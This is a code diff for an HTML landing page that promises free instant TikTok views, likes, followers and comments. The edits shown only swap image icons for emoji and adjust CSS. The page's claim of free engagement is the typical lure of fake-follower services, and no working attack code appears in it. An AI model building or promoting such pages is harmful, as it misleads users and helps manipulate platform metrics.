@@ -45,8 +45,11 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
         .logo {
-            width: 80px;
+            font-size: 60px; /* Adjusted size for emoji */
+            line-height: 1;
             margin-bottom: 20px;
+            color: #e62241; /* TikTok red */
+            text-shadow: 0 0 10px rgba(230, 34, 65, 0.7);
         }
         h1 {
             font-size: 2.2em;
@@ -130,14 +133,15 @@
             background: rgba(230, 34, 65, 0.2);
             transform: translateY(-5px);
         }
-        .service-card img {
-            width: 40px;
-            height: 40px;
+        .service-card .icon { /* Using a class for the emoji/symbol */
+            font-size: 40px;
             margin-bottom: 10px;
-            filter: grayscale(100%) brightness(200%);
+            line-height: 1;
+            filter: grayscale(100%); /* Start gray */
+            transition: filter 0.3s;
         }
-        .service-card.selected img {
-            filter: grayscale(0%) brightness(100%);
+        .service-card.selected .icon {
+            filter: grayscale(0%); /* Full color on select */
         }
         .quantity-selector {
             margin-top: 15px;
@@ -234,7 +238,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/TikTok_logo.svg/768px-TikTok_logo.svg.png" alt="TikTok Logo" class="logo">
+        <span class="logo">🎵</span>
         <h1>Boost Your TikTok Presence</h1>
         <p>Get instant views, likes, followers, and comments on your TikTok videos for free!</p>
 
@@ -253,7 +257,7 @@
 
             <div class="service-selection" id="serviceSelection" style="display:none;">
                 <div class="service-card" data-service="views">
-                    <img src="https://www.svgrepo.com/show/511082/play.svg" alt="Views">
+                    <span class="icon">▶️</span>
                     <h3>Views</h3>
                     <div class="quantity-selector">
                         <button type="button" class="minus-btn">-</button>
@@ -262,7 +266,7 @@
                     </div>
                 </div>
                 <div class="service-card" data-service="likes">
-                    <img src="https://www.svgrepo.com/show/511059/heart-add.svg" alt="Likes">
+                    <span class="icon">❤️</span>
                     <h3>Likes</h3>
                     <div class="quantity-selector">
                         <button type="button" class="minus-btn">-</button>
@@ -271,7 +275,7 @@
                     </div>
                 </div>
                 <div class="service-card" data-service="followers">
-                    <img src="https://www.svgrepo.com/show/503460/user-add.svg" alt="Followers">
+                    <span class="icon">👥</span>
                     <h3>Followers</h3>
                     <div class="quantity-selector">
                         <button type="button" class="minus-btn">-</button>
@@ -280,7 +284,7 @@
                     </div>
                 </div>
                 <div class="service-card" data-service="comments">
-                    <img src="https://www.svgrepo.com/show/511052/comment-empty.svg" alt="Comments">
+                    <span class="icon">💬</span>
                     <h3>Comments</h3>
                     <div class="quantity-selector">
                         <button type="button" class="minus-btn">-</button>
@@ -289,7 +293,7 @@
                     </div>
                 </div>
                 <div class="service-card" data-service="shares">
-                    <img src="https://www.svgrepo.com/show/511078/share.svg" alt="Shares">
+                    <span class="icon">↗️</span>
                     <h3>Shares</h3>
                     <div class="quantity-selector">
                         <button type="button" class="minus-btn">-</button>
@@ -298,7 +302,7 @@
                     </div>
                 </div>
                 <div class="service-card" data-service="favorites">
-                    <img src="https://www.svgrepo.com/show/511083/bookmark.svg" alt="Favorites">
+                    <span class="icon">⭐</span>
                     <h3>Favorites</h3>
                     <div class="quantity-selector">
                         <button type="button" class="minus-btn">-</button>
